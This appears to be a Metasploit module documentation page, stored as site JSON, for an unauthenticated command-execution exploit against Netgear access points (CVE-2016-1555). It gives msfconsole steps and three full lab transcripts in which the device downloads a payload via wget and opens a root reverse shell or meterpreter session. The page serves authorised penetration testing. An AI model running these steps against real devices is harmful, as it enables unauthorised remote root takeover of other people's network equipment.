{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/netgear_unauth_exec","result":{"data":{"moduleMetadataJson":{"id":"00346a7b-c28a-5a9c-964f-a59677f824f1","name":"Netgear Devices Unauthenticated Remote Command Execution","fullname":"exploit/linux/http/netgear_unauth_exec","description":"From the CVE-2016-1555 page: (1) boardData102.php, (2) boardData103.php,\n        (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in\n        Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350,\n        WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute\n        arbitrary commands.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/netgear_unauth_exec","documentationSlug":"/modules/documentation/exploit/linux/http/netgear_unauth_exec","referencesSlug":"/modules/references/exploit/linux/http/netgear_unauth_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>The module leverages an unauthenticated arbitrary command execution vulnerability in Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350, WNDAP360, and WNDAP660 before 3.5.5.0. The vulnerability occurs within how the router handles POST requests from (1) boardData102.php, (2) boardData103.php, (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php. The vulnerability was discovered by Daming Dominic Chen, creator of FIRMADYNE (<a href=\"https://github.com/firmadyne/firmadyne\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/firmadyne/firmadyne</a>).</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do : <code class=\"language-text\">use exploit/linux/http/netgear_unauth_exec</code></li>\n<li>Do : <code class=\"language-text\">set RHOST [RouterIP]</code></li>\n<li>Do : <code class=\"language-text\">set SRVHOST [Your server&#39;s IP]</code> if your payload isn't being hosted on another system</li>\n<li>Do : <code class=\"language-text\">set LHOST [Your IP]</code></li>\n<li>Do : <code class=\"language-text\">set MAC_ADDRESS [12 digit number]</code> if you want some specific MAC address instead of a random one</li>\n<li>Do : <code class=\"language-text\">set TARGETURI [target URI]</code> if you want to target another URI instead of the default <code class=\"language-text\">boardDataWW.php</code></li>\n<li>Do : <code class=\"language-text\">set PAYLOAD linux/mipsbe/meterpreter/reverse_tcp</code> if you want meterpreter session</li>\n<li>Do : <code class=\"language-text\">exploit</code></li>\n<li>If router is vulnerable, payload should be dropped via wget (the default HTTP stager) and executed, and you should obtain a session</li>\n</ol>\n<h2 id=\"example-with-default-payload-linuxmipsbeshellreversetcp\" style=\"position:relative;\"><a href=\"#example-with-default-payload-linuxmipsbeshellreversetcp\" aria-label=\"example with default payload linuxmipsbeshellreversetcp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example with default payload (linux/mipsbe/shell<em>reverse</em>tcp)</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/netgear_unauth_exec \nmsf exploit(linux/http/netgear_unauth_exec) &gt; set RHOST 192.168.200.100\nRHOST =&gt; 192.168.200.100\nmsf exploit(linux/http/netgear_unauth_exec) &gt; set LHOST 192.168.200.99\nLHOST =&gt; 192.168.200.99\nmsf exploit(linux/http/netgear_unauth_exec) &gt; set SRVHOST 192.168.200.99\nSRVHOST =&gt; 192.168.200.99\nmsf exploit(linux/http/netgear_unauth_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.200.99:4444 \n[*] Using URL: http://192.168.200.99:8080/Ekvrz8LbW\n[*] Client 192.168.200.100 (Wget) requested /Ekvrz8LbW\n[*] Sending payload to 192.168.200.100 (Wget)\n[*] Command shell session 1 opened (192.168.200.99:4444 -&gt; 192.168.200.100:56852) at 2018-10-09 20:24:56 +0630\n[*] Command Stager progress - 118.97% done (138/116 bytes)\n[*] Server stopped.\n\nuname -a\nLinux netgear123456 2.6.32.70 #1 Thu Feb 18 01:39:21 UTC 2016 mips unknown\nid\nuid=0(root) gid=0(root)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"example-with-meterpreter-linuxmipsbemeterpreterreverse_tcp\" style=\"position:relative;\"><a href=\"#example-with-meterpreter-linuxmipsbemeterpreterreverse_tcp\" aria-label=\"example with meterpreter linuxmipsbemeterpreterreverse_tcp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example with meterpreter (linux/mipsbe/meterpreter/reverse_tcp)</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/netgear_unauth_exec \nmsf exploit(linux/http/netgear_unauth_exec) &gt; set RHOST 192.168.200.100\nRHOST =&gt; 192.168.200.100\nmsf exploit(linux/http/netgear_unauth_exec) &gt; set PAYLOAD linux/mipsbe/meterpreter/reverse_tcp\nPAYLOAD =&gt; linux/mipsbe/meterpreter/reverse_tcp\nmsf exploit(linux/http/netgear_unauth_exec) &gt; set LHOST 192.168.200.99\nLHOST =&gt; 192.168.200.99\nmsf exploit(linux/http/netgear_unauth_exec) &gt; set SRVHOST 192.168.200.99\nSRVHOST =&gt; 192.168.200.99\nmsf exploit(linux/http/netgear_unauth_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.200.99:4444 \n[*] Using URL: http://192.168.200.99:8080/x6ZYzUoe9x7IR\n[*] Client 192.168.200.100 (Wget) requested /x6ZYzUoe9x7IR\n[*] Sending payload to 192.168.200.100 (Wget)\n[*] Sending stage (1108408 bytes) to 192.168.200.100\n[*] Meterpreter session 1 opened (192.168.200.99:4444 -&gt; 192.168.200.100:56854) at 2018-10-09 20:26:39 +0630\n[*] Command Stager progress - 118.33% done (142/120 bytes)\n[*] Server stopped.\n\nmeterpreter &gt; sysinfo\nComputer     : 192.168.200.100\nOS           :  (Linux 2.6.32.70)\nArchitecture : mips\nBuildTuple   : mips-linux-muslsf\nMeterpreter  : mipsbe/linux\nmeterpreter &gt; getuid \nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"example-using-some-other-vulnerable-uri-boarddatanaphp\" style=\"position:relative;\"><a href=\"#example-using-some-other-vulnerable-uri-boarddatanaphp\" aria-label=\"example using some other vulnerable uri boarddatanaphp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example using some other vulnerable URI (boardDataNA.php)</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/netgear_unauth_exec \nmsf exploit(linux/http/netgear_unauth_exec) &gt; set RHOST 192.168.200.100\nRHOST =&gt; 192.168.200.100\nmsf exploit(linux/http/netgear_unauth_exec) &gt; set TARGETURI boardDataNA.php\nTARGETURI =&gt; boardDataNA.php\nmsf exploit(linux/http/netgear_unauth_exec) &gt; set LHOST 192.168.200.99\nLHOST =&gt; 192.168.200.99\nmsf exploit(linux/http/netgear_unauth_exec) &gt; set SRVHOST 192.168.200.99\nSRVHOST =&gt; 192.168.200.99\nmsf exploit(linux/http/netgear_unauth_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.200.99:4444 \n[*] Using URL: http://192.168.200.99:8080/zlJyAS8F1As\n[*] Client 192.168.200.100 (Wget) requested /zlJyAS8F1As\n[*] Sending payload to 192.168.200.100 (Wget)\n[*] Command shell session 1 opened (192.168.200.99:4444 -&gt; 192.168.200.100:56856) at 2018-10-09 20:28:41 +0630\n[*] Command Stager progress - 118.64% done (140/118 bytes)\n[*] Server stopped.\n\nuname -a\nLinux netgear123456 2.6.32.70 #1 Thu Feb 18 01:39:21 UTC 2016 mips unknown\nid\nuid=0(root) gid=0(root)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"00346a7b-c28a-5a9c-964f-a59677f824f1"}}}